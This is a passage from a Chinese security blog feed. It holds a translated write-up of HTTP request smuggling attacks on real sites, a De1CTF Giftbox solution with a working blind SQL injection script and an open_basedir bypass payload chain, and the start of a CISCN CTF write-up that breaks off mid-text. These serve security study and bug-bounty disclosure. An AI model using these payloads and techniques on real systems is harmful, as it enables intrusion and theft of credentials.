title="Explore"></a>Explore</h2><p>我将使用一系列真实的网站演示其余的方法。像往常一样，我专门针对那些明确表示愿意通过运行bug奖励计划与安全研究人员合作的公司。多亏了大量涌现的私人程序和不打补丁的习惯，我不得不编写很多案例。在明确声明网站的地方，请记住，它们是少数能够抵御这种攻击的安全网站之一。</p><p>现在我们已经确定套接字投毒是可能的，下一步是收集信息，这样我们就可以发动一次全面的攻击。</p><p>前端通常会附加和重写HTTP请求头，如x-forwarded-host和x-forwarded-for，以及许多经常难以猜测名称的自定义头。我们的走私请求可能缺少这些头，这可能导致意外的应用程序行为和失败的攻击。</p><p>幸运的是，有一个简单的策略另辟蹊径，并且可以看到这些隐藏的header头。这使得我们可以通过手动添加头来恢复功能，甚至可以启用进一步的攻击。</p><p>只需在目标应用程序上查找一个反射post参数的页面，对参数进行无序排列，使反射的参数排列最后，稍微增加内容长度，然后将生成的请求进行走私：<br><img src="http://static.zybuluo.com/1160307775/4ie737yk1pu8d49dpv11lrrp/image_1dhvv1j72jm7qdm132e1ekoaim7s.png" alt="image_1dhvv1j72jm7qdm132e1ekoaim7s.png-54.9kB"></p><p>绿色请求将在其到达login[email]参数之前由前端重写，因此当它被反射回来时，将泄漏所有内部头：</p><p><img src="http://static.zybuluo.com/1160307775/pe2e05lr18lvcyjofytq9j7p/image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png" alt="image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png-45.5kB"></p><p>通过增加Content-Length头，您可以逐步检索更多信息，直到您试图读取超过受害者请求末尾的内容，并且受害者的请求会超时。</p><p>有些系统完全依赖于前端系统的安全性，一旦您bypass，您就可以直接为所欲为。在login.new relic.com上，“后端”系统是反代的，因此更改走私的主机头授予我访问不同的新relic系统的权限。最初，我访问的每个内部系统都认为我的请求是通过HTTP发送的，并以重定向方式响应的：</p><p><img src="http://static.zybuluo.com/1160307775/h3bs3zziu7yq9f3ltsxga4y1/image_1dhvvp3og1rod1iu28cetojpb59m.png" alt="image_1dhvvp3og1rod1iu28cetojpb59m.png-22.2kB"></p><p>使用前面观察到的x-forwarded-proto头很容易修复：<br><img src="http://static.zybuluo.com/1160307775/1sy6c955n8mv6iou1qbmcxde/image_1dhvvq6j81n781hslpqtel1o38a3.png" alt="image_1dhvvq6j81n781hslpqtel1o38a3.png-24.7kB"></p><p>通过一些目录，我在目标上找到了一个有用的端点：<br><img src="http://static.zybuluo.com/1160307775/7s94vz15z04k0rj1rk1elzvj/image_1dhvvt1km1bb81cd82bou11aufag.png" alt="image_1dhvvt1km1bb81cd82bou11aufag.png-25.3kB"></p><p>错误消息清楚地告诉我需要某种类型的授权头，但却没有告诉我字段名。我决定尝试前面看到的“x-nr-external-service”头段：<br><img src="http://static.zybuluo.com/1160307775/sfiuf8gboh57gq3ltxtm6ne8/image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png" alt="image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png-29.4kB"></p><p>不幸的是，这不起作用——它导致了我们在直接访问该URL时已经看到的相同的禁止响应。这表明前端正在使用x-nr-external-service头来指示请求来自Internet，通过走私因此丢失请求头，我们已经诱使系统认为我们的请求来自内部。这是非常有意义的，但没有直接的用处——我们仍然需要缺少的授权头的名称。</p><p>此时，我可以将已处理的请求反射技术应用到一系列端点，直到找到一个具有正确请求头的端点。相反，我决定从上一次我的New Relic6中查询一些笔记，这显示了两个非常宝贵的报头-Server-Gateway-Account-Id and Service- Gateway-Is-Newrelic-Admin。使用这些工具，我可以获得对其内部API的完全管理级访问：<br><img src="http://static.zybuluo.com/1160307775/cj5947kaur85xykxf7725ym6/image_1di00ssli1mfu1381nml92h1mn4ba.png" alt="image_1di00ssli1mfu1381nml92h1mn4ba.png-78.4kB"></p><p>New Relic部署了一个修补程序，并将根本原因诊断为F5网关中的一个弱点。据我所知，没有可用的补丁，这意味着在写作的时候这仍然是0day。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>直接进入内部API确实不错，但它很少是我们唯一的选择。我们还可以针对浏览目标网站的每个人发起大量不同的攻击。</p><p>要确定哪些攻击可以应用到其他用户，我们需要了解哪些类型的请求可以被破坏。从“确认”阶段重复套接字中毒测试，但反复调整“受害者”请求，直到它类似于典型的GET请求。您可能会发现，您只能使用某些方法、路径或头毒害请求。另外，尝试从不同的IP地址发出受害者请求-在极少数情况下，您可能会发现您只能对来自同一IP的请求进行毒害。</p><p>最后，检查网站是否使用Web缓存-这些可以帮助绕过许多限制，增加我们对哪些资源中毒的控制，并最终增加请求走私漏洞的严重性。</p><h3 id="Store"><a href="#Store" class="headerlink" title="Store"></a>Store</h3><p>如果应用程序支持编辑或存储任何类型的文本数据，那么利用就非常容易。通过在受害者的请求前加上一个精心设计的存储请求，我们可以让应用程序保存他们的请求并将其显示给我们，然后窃取任何身份验证cookie/headers。下面是一个以Trello为目标的示例，使用其配置文件编辑端点：</p><p><img src="http://static.zybuluo.com/1160307775/txwaqf2l9ruc7nv89gyxljog/image_1di01d7421dui1a81nbepu2btbn.png" alt="image_1di01d7421dui1a81nbepu2btbn.png-54.1kB"></p><p>一旦受害者的请求到达，它就会保存在我的个人资料中，暴露他们所有的头和cookie：</p><p><img src="http://static.zybuluo.com/1160307775/2622oq8b4q8yery1kpm2s8jw/image_1di01e9oa1c4s19e513t9p564a8c4.png" alt="image_1di01e9oa1c4s19e513t9p564a8c4.png-48.7kB"></p><p>使用这种技术的唯一主要目的是丢失“&amp;”之后发生的任何数据，这使得从表单编码的post请求中窃取主体很困难。我花了一段时间试图通过使用可选的请求编码来解决这个限制，最终放弃了，但我仍然怀疑这是可能的。</p><p>数据存储的机会并不总是如此明显——在另一个网站上，我可以使用“联系我们”表单，最终触发一封包含受害者请求的电子邮件，并获得2500美元的额外收入。</p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>能够将一个任意前缀应用到其他人的响应中，也打开了另一种攻击途径——触发一个有害的响应。</p><p>使用有害反应有两种主要方法。最简单的方法是发出“攻击”请求，然后等待其他人的请求击中后端套接字并触发有害响应。一种更为棘手但更强大的方法是亲自发出“攻击”和“受害者”请求，并希望对受害者请求的有害响应通过Web缓存保存，并提供给访问同一URL的任何其他人-Web缓存中毒。</p><p>在以下每个请求/响应片段中，黑色文本是对第二个（绿色）请求的响应。第一个（蓝色）请求的响应被忽略，因为它不相关。</p><h2 id="Upgrading-XSS"><a href="#Upgrading-XSS" class="headerlink" title="Upgrading XSS"></a>Upgrading XSS</h2><p>在审计一个SaaS应用程序时，Param Miner7发现了一个名为saml的参数，Burp scaner证实它易受反射XSS的攻击。反射式XSS本身不错，但在规模上很难利用，因为它需要用户交互。</p><p>通过请求走私，我们可以对主动浏览网站的随机用户提供包含XSS的响应，从而实现直接的大规模利用。我们还可以访问authentication headers 和仅HTTP cookie，这可能会让我们转到其他域。</p><p><img src="http://static.zybuluo.com/1160307775/l8sr33d0y8t306l6qx5higvw/image_1di01r6qa1iap8ki1vh0gdg17s9d1.png" alt="image_1di01r6qa1iap8ki1vh0gdg17s9d1.png-70.8kB"></p><h2 id="Grasping-the-DOM"><a href="#Grasping-the-DOM" class="headerlink" title="Grasping the DOM"></a>Grasping the DOM</h2><p>在<a href="http://www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：" target="_blank" rel="noopener">www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：</a><br><img src="http://static.zybuluo.com/1160307775/xu9tr6kxrkzl7m0t2uvwdlrs/image_1di01vv584rumq9d5r1ormld2de.png" alt="image_1di01vv584rumq9d5r1ormld2de.png-34.5kB"></p><p>页面上的一些javascript正在从受害者浏览器的查询字符串中读取“redir”参数，但我如何控制它？请求走私使我们能够控制服务器认为查询字符串是什么，但是受害者的浏览器对查询字符串的认知只是了解用户试图访问哪个页面。</p><p>我可以通过链接服务器端的非开放重定向来解决这个问题：</p><p><img src="http://static.zybuluo.com/1160307775/klj8f2y8p7hgayr8jvzphtkn/image_1di025q9518k91g5dh8drkna2feb.png" alt="image_1di025q9518k91g5dh8drkna2feb.png-70.3kB"></p><p>受害者浏览器将收到一个301重定向到<a href="https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。" target="_blank" rel="noopener">https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。</a></p><h2 id="CDN-Chaining"><a href="#CDN-Chaining" class="headerlink" title="CDN Chaining"></a>CDN Chaining</h2><p>有些网站使用多层反向代理和cdn。这给了我们额外的机会去同步，这是一直被赞赏的，它也经常增加严重性</p><p>一个目标是不知何故地使用两层Akamai，尽管服务器由同一供应商提供，但仍有可能将它们不同步，因此，在受害者网站的Akamai network中提供不同的内容：<br><img src="http://static.zybuluo.com/1160307775/oy6dcrszjf3k5nzxie51n427/image_1di02gpq91n7jc93pii6hsvseo.png" alt="image_1di02gpq91n7jc93pii6hsvseo.png-45.2kB"></p><p>同样的概念也适用于SaaS提供商——我能够攻破一个建立在知名SaaS平台上的关键网站，将请求定向到建立在同一平台上的不同系统。</p><h2 id="‘Harmless’-responses"><a href="#‘Harmless’-responses" class="headerlink" title="‘Harmless’ responses"></a>‘Harmless’ responses</h2><p>因为请求走私让我们影响对任意请求的响应，一些通常无害的行为成为可利用的。例如，即使是不起眼的开放式重定向，也可以通过将javascript导入重定向到恶意域来危害帐户。</p><p>使用307代码的重定向特别有用，因为在发出post请求后接收307的浏览器将把post重新发送到新的目的地。这可能意味着你可以让不知情的受害者直接将他们的明文密码发送到你的网站。</p><p>经典的开放式重定向本身就很常见，但是有一种变体在Web中普遍存在，因为它源于Apache和IIS中的默认行为。它很方便地被认为是无害的，被几乎所有人忽视，因为没有像请求走私这样的伴随的弱点，它确实是无用的。如果尝试访问没有尾随斜杠的文件夹，服务器将使用主机头中的主机名进行重定向以附加斜杠：<br><img src="http://static.zybuluo.com/1160307775/fpic6gjvppuog2tlgow0f4gl/image_1di033eund4netio7jsa3nf4f5.png" alt="image_1di033eund4netio7jsa3nf4f5.png-44.4kB"></p><p>使用此技术时，请密切关注重定向中使用的协议。您可以使用像x-forwarded-ssl这样的头来影响它。如果它卡在HTTP上，而您攻击的是一个HTTPS站点，那么受害者的浏览器将由于其混合内容保护而阻止连接。有两个已知的例外8-可以完全绕过Internet Explorer的混合内容保护，如果重定向目标在其HSTS缓存中，Safari将自动升级到HTTPS的连接。</p><h2 id="Web-Cache-Poisoning"><a href="#Web-Cache-Poisoning" class="headerlink" title="Web Cache Poisoning"></a>Web Cache Poisoning</h2><p>在尝试对特定网站进行基于重定向的攻击几个小时后，我在浏览器中打开了他们的主页以查找更多的攻击面，并在Dev控制台中发现了以下错误：</p><p><img src="http://static.zybuluo.com/1160307775/b8jv6t5emd2ty057r7njho6u/image_1di037a5k1iq51f7a19n51jmc600fi.png" alt="image_1di037a5k1iq51f7a19n51jmc600fi.png-18.5kB"></p><p>无论从哪台机器加载网站，都会发生此错误，并且IP地址看起来非常熟悉。在我的重定向探测期间，在我的受害者请求之前，有人请求了一个图像文件，而中毒的响应被缓存保存了下来。</p><p>这是对潜在影响的一个很好的证明，但总的来说并不是一个理想的结果。除了依赖基于超时的检测，没有办法完全消除意外缓存中毒的可能性。也就是说，为了将风险降到最低，你可以：<br>-确保“受害者”请求有一个缓存阻止程序。</p><p>-使用turbo Intruder，尽快发送“受害者”请求。<br>-尝试创建一个前缀来触发反缓存头的响应，或者一个不太可能被缓存的状态代码。<br>-在不常用的前端处实施攻击。</p><h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception++"></a>Web Cache Deception++</h2><p>如果我们不尝试减少攻击者/用户混合响应缓存的机会，而是接受它呢？</p><p>我们可以尝试用受害者的cookie获取包含敏感信息的响应，而不是使用设计用于导致有害响应的前缀：<br><img src="http://static.zybuluo.com/1160307775/n6jss7idvvrs8bz0933pb08e/image_1di03lb12var1itka221437galfv.png" alt="image_1di03lb12var1itka221437galfv.png-24.3kB"></p><p>前端请求：<br><img src="http://static.zybuluo.com/1160307775/rr9iwmh76f9jexgwfedovzyu/image_1di03ot516ne1j91u041oh61tu5gs.png" alt="image_1di03ot516ne1j91u041oh61tu5gs.png-13.1kB"></p><p>当用户对静态资源的请求到达中毒的套接字时，响应将包含其帐户详细信息，并且缓存将通过静态资源保存这些信息。然后，我们可以通过从缓存中加载/static/site.js来检索帐户详细信息。</p><p>这实际上是Web缓存欺骗攻击的一个新变体。它在两个关键方面更强大——它不需要任何用户交互，也不需要目标站点允许您使用扩展。唯一的陷阱是攻击者无法确定受害者的反应将落在何处。</p><h2 id="PayPal"><a href="#PayPal" class="headerlink" title="PayPal"></a>PayPal</h2><p>由于请求走私连锁缓存中毒，我能够持续劫持众多JavaScript文件，其中之一是在Paypal的登录页面：<a href="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" target="_blank" rel="noopener">https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js</a>.</p><p><img src="http://static.zybuluo.com/1160307775/wmoqtjprhf707is1xo7ka1ka/image_1di03u9lu1fb2tur1n51ekl9loh9.png" alt="image_1di03u9lu1fb2tur1n51ekl9loh9.png-61.8kB"></p><p>但是有一个问题——PayPal的登录页面使用了<code>script-src</code>的csp，它破坏了我的重定向。<br><img src="http://static.zybuluo.com/1160307775/cpxwv9v85x5usy6th6jdwu98/image_1di040r7764spvs1orqvbk96rhm.png" alt="image_1di040r7764spvs1orqvbk96rhm.png-23.4kB"></p><p>起初，这看起来像是纵深防御的胜利。但是，我注意到登录页面在一个动态生成的iframe中加载了c.paypal.com上的一个子页面。此子页没有使用CSP，还导入了我们的有害JS文件。这使我们完全控制了iframe的内容，但是由于同源策略，我们仍然无法从父页面读取用户的Paypal密码。</p><p><img src="http://static.zybuluo.com/1160307775/dkyfc1gj4hzy6ihqaqc20wbx/image_1di0433272ms1vie1ond1n1p1eqqi3.png" alt="image_1di0433272ms1vie1ond1n1p1eqqi3.png-40.2kB"></p><p>我的同事GarethHeyes随后在paypal.com/us/gifts上发现了一个不使用CSP的页面，并导入了我们中毒的JS文件。通过使用我们的JS重定向c.paypal.com iframe到该URL（并在第三次触发我们的JS），我们最终可以从使用Safari或IE登录的所有人访问父和窃取明文Paypal密码。<br><img src="http://static.zybuluo.com/1160307775/kgm49hw0deq81v5z9k90qsyo/image_1di0462kcnfm1ik4v7v19q81ue0ig.png" alt="image_1di0462kcnfm1ik4v7v19q81ue0ig.png-68.3kB"></p><p>PayPal通过配置Akamai拒绝包含传输编码的请求：chunked header，快速地解决了这个漏洞，并授予了18900美元的赏金。</p><p>几周后，在发明和测试一些新的去同步技术时，我决定尝试使用一个换行的头文件：<br><img src="http://static.zybuluo.com/1160307775/bsi9yau5mqmjou0cgxvas5iv/image_1di048085cfbp1e3b1hmeeddit.png" alt="image_1di048085cfbp1e3b1hmeeddit.png-5.3kB"></p><p>这似乎使转移编码头对于Akamai来说不可见，成功绕过，并再次授予我控制Paypal的登录页面。PayPal迅速应用了一个更稳健的解决方案，并获得了令人印象深刻的20000美元。(译者跪了2333)</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>另一个目标使用了反向代理链，其中一个没有将’\n’视为有效的头终止符。这意味着他们的网络基础设施中相当大的一部分容易受到走私请求的攻击。我录制了一个演示，演示如何使用非同步来有效地识别和利用Bugzilla安装的副本上的漏洞，该副本包含一些非常敏感的信息。</p><p>您可以在本白皮书的在线版本<a href="https://portswigger.net/blog/http-desync-attacks9中找到该视频。" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks9中找到该视频。</a></p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><p>像往常一样，安全很简单。如果您的网站没有负载均衡器、cdn和反向代理，那么这种技术就不是一种威胁。引入的层越多，就越容易受到攻击。</p><p>每当我讨论攻击技术时，我都会被问到HTTPS是否可以阻止它。一如既往，答案是“不”。也就是说，通过将前端服务器配置为专门使用HTTP/2与后端系统通信，或者完全禁用后端连接重用，可以解决此漏洞的所有变体。或者，您可以确保链中的所有服务器使用相同的配置运行相同的Web服务器软件。</p><p>可以通过重新配置前端服务器来解决此漏洞的特定实例，以便在继续路由之前将不明确的请求规范化。对于不想让客户受到攻击的客户来说，这可能是唯一现实可行的解决方案，CloudFlare和Fastly似乎成功地应用了它。</p><p>对于后端服务器来说，正常化请求不是一个选项——它们需要彻底拒绝不明确的请求，并删除关联的连接。由于拒绝请求比简单地使其正常化更可能影响合法流量，因此我建议重点防止通过前端服务器进行请求走私。</p><p>当你的工具对你不利时，有效的防御是不可能的。大多数Web测试工具在发送请求时都会自动“更正”内容长度头段，从而使请求无法走私。在BurpSuite中，您可以使用Repeater menu禁用此行为-确保您选择的工具具有同等的功能。此外，某些公司和bug赏金平台通过Squid之类的代理来转发测试人员的流量，以便进行监控。这些将管理测试人员发起的任何请求走私攻击，确保公司对该漏洞类的覆盖率为零。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在多年来一直被忽视的研究基础上，我引入了新的技术来取消服务器的同步，并演示了使用大量真实网站作为案例研究来利用结果的新方法。</p><p>通过这一点，我已经证明了请求走私是对Web的主要威胁，HTTP请求解析是一个安全关键的功能，容忍不明确的消息是危险的。我还发布了一个方法论和一个开源工具包，帮助人们审计请求走私，证明其影响，并以最小的风险获得奖金。</p><p>这一主题仍在研究中，因此我希望本出版物将有助于在未来几年内激发新的去同步技术和开发。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack" target="_blank" rel="noopener">https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack</a></li><li><a href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc2616#section-4.4</a></li><li><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">https://regilero.github.io/tag/Smuggling/</a></li><li><a href="https://github.com/portswigger/desynchronize" target="_blank" rel="noopener">https://github.com/portswigger/desynchronize</a></li><li><a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface</a> 7. <a href="https://github.com/PortSwigger/param-miner" target="_blank" rel="noopener">https://github.com/PortSwigger/param-miner</a></li><li><a href="https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning" target="_blank" rel="noopener">https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning</a> </li><li><a href="https://portswigger.net/blog/http-desync-attacks" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks</a></li></ol><h2 id="议题原文件"><a href="#议题原文件" class="headerlink" title="议题原文件"></a>议题原文件</h2><p><a href="https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew" target="_blank" rel="noopener">https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door&quot;&gt;&lt;a href=&quot;#HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door&quot; class=&quot;headerl
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF-Giftbox题解</title>
    <link href="https://hpdoger.cn/2019/08/06/De1CTF-Giftbox%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2019-08-06T03:09:32.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="De1CTF-Giftbox题解"><a href="#De1CTF-Giftbox题解" class="headerlink" title="De1CTF-Giftbox题解"></a>De1CTF-Giftbox题解</h1><p>这次Web题的难度有阶层，<code>SSRF Me</code>是一个验签的绕过调用python的url_open进行ssrf请求、web4是一道n1ctf的原题，也懒得写wp了。还有两道比较难的，一道是ZSX师傅出的calc，统一三个后端的输出结果，过滤了括号。还有一道魔改了ciscn——2019的滑稽云，更改了溢出区的大小+外带结果。</p><p>最后就是Giftbox，不得不说，这是我见过最有小情调的ctf题目。做了一个伪unix页面，存在几个bash命令，和一个登陆功能，在登陆处存在sql注入(需要经过双因子认证)。比赛的时候没做出来，趁着赛题没关复现一下(顺便膜爆恩泽师傅orz..)</p><p><img src="http://static.zybuluo.com/1160307775/fa8kq5dg6w9kvypaq7gmtn5d/image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png" alt="image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png-979.2kB"></p><h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><p>这种认证第一次见，其实是调用pyotp模块去验证，随便输入会报错<br><img src="http://static.zybuluo.com/1160307775/yqxk48t3uo4tmzrgjt4d30kg/image_1dhfn759ve4c17uv1eqv1rpq876m.png" alt="image_1dhfn759ve4c17uv1eqv1rpq876m.png-203.2kB"></p><p>既然是前端发送验证请求，那就应该存在发送的ajax请求包。重点在开发者nodets和请求形式。它提示我们后端用了pyotp.zip的库去验证，而且在请求形式中把secret_key给了我们:<code>GAXG24JTMZXGKZBU</code></p><p><img src="http://static.zybuluo.com/1160307775/apyakaxxoilaq4ixhqk9ss1u/image_1dhfn9snj1dtme3d11eea3nm2v13.png" alt="image_1dhfn9snj1dtme3d11eea3nm2v13.png-165.3kB"></p><p>队内师傅提醒说，python3的pyotp模块也可以根据key生成验证<br><img src="http://static.zybuluo.com/1160307775/k5n1ymx6sv0p2188k8r01wr3/image_1dhfniaosich1f5b1ptm1jk8t4s1g.png" alt="image_1dhfniaosich1f5b1ptm1jk8t4s1g.png-140.6kB"></p><p>赛后看到天枢的师傅用xhr发送请求，即前端爆破就可以直接调用topt函数，也是种不错的思路，学习了。</p><p>接着就是一个简单的注入</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>脚本如下，空格会导致程序判断为参数分隔符，所以用/**/替代</p><pre><code>#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsimport pyotp as pyotpimport stringtotp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)def curl(payload):    r = requests.post(&#39;http://222.85.25.41:8090/shell.php&#39;, params={&#39;a&#39;: &#39;login admin\&#39;/**/and/**/(&#39; + payload + &#39;)/**/and/**/\&#39;1\&#39;=\&#39;1 admin&#39;, &#39;totp&#39;: totp.now()},                      data={&#39;dir&#39;: &#39;/&#39;, &#39;pos&#39;: &#39;/&#39;, &#39;filename&#39;: &#39;usage.md&#39;})    if &#39;password&#39; in r.text:        return True    else:        return Falsedef sqli():    for i in range(0, 2):        # db_data = &quot;SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        # db_data = &quot;SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/and/**/table_name=\&#39;users\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        db_data = &quot;select/**/password/**/from/**/giftbox.users/**/where/**/username/**/=/**/&#39;admin&#39;/**/limit/**/{},1&quot;.format(            i)        db_res = &quot;&quot;        for y in range(1, 64):            for c in string.printable:                db_res_payload = &quot;substr((&quot; + db_data + &quot;),%d,1)/**/=/**/&#39;%s&#39;&quot; % (y,c)                if curl(db_res_payload):                    db_res += c                    print(&quot;&gt; &quot; + db_res)                    break                else:pass            if db_res == &quot;&quot;:                breakif __name__ == &#39;__main__&#39;:    sqli()</code></pre><p>最后注入password字段得到一个hint为<code>hinT{g1ve_u_hi33en_c0mm3nd-sh0w_hiiintttt_23333}</code>，登陆成功同时提示</p><p><img src="http://static.zybuluo.com/1160307775/y3uyi4qslzpihrrxqpk5w7x1/image_1dhi8qiij18ve18991q95u1skfb1m.png" alt="image_1dhi8qiij18ve18991q95u1skfb1m.png-86kB"></p><h2 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h2><p>同时题目存在targeting命令，具体用法如下。结合之前的提示，推测是对每一个target进行一次eval的操作，因为targeting不允许存在双引号，所以用复杂变量${xxx(xxx)}的形式代替</p><p><img src="http://static.zybuluo.com/1160307775/4q86j7w2c84e21wjkvrk4bsr/image_1dhic3q29as9fln24sr29vts9.png" alt="image_1dhic3q29as9fln24sr29vts9.png-411.3kB"></p><p>但是没有执行到system(whoami)，推测是有open_dir，用网上的方法bypass:<a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p><p>最后的payload如下，因为有长度限制，进行变量拼接</p><pre><code>targeting a chdirtargeting b csstargeting c {$a($b)}targeting d ini_settargeting e open_basedirtargeting f ..targeting g {$d($e,$f)}targeting h {$a($f)}targeting i {$a($f)}targeting j base64_targeting k decodetargeting l $j$ktargeting m Ly8vtargeting n {$l($m)}targeting o {$d($e,$n)}targeting p print_rtargeting q file_get_targeting r contentstargeting s $q$rtargeting t flagtargeting u {$p($s($t))}launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvio5k3p7kn68w9o/image_1dhiec48lrbmsku1m3eu9pbjm2p.png" alt="image_1dhiec48lrbmsku1m3eu9pbjm2p.png-128.9kB"></p><p>再次膜恩泽师傅..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;a href=&quot;#De1CTF-Giftbox题解&quot; class=&quot;headerlink&quot; title=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;/a&gt;De1CTF-Giftbox题解&lt;/h1&gt;&lt;p&gt;这次Web题的难度有阶层，&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11题解</title>
    <link href="https://hpdoger.cn/2019/07/29/CISCN%202019%20Final%20Web11%E5%A4%8D%E7%9B%98/"/>
    <id>https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11复盘/</id>
    <published>2019-07-28T16:00:00.000Z</published>
    <updated>2019-07-30T01:21:54.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p><p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p><p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p><pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p><p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p><p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p><p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p><p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p><p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p><p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img 